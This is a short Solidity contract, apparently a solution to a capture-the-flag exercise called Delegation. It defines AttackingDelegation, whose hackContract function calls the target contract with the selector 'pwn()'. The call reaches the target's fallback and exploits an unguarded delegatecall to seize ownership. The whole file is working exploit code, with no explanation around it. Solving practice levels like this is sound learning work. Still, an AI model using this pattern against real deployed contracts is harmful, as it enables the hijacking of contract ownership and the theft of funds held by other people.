// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public contractAddress;
    Delegation delegationContract;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
        delegationContract = Delegation(_contractAddress);
    }

    function hackContract() external {
        (bool success, bytes memory data) = address(delegationContract).call(abi.encodeWithSignature("pwn()"));
    }
}
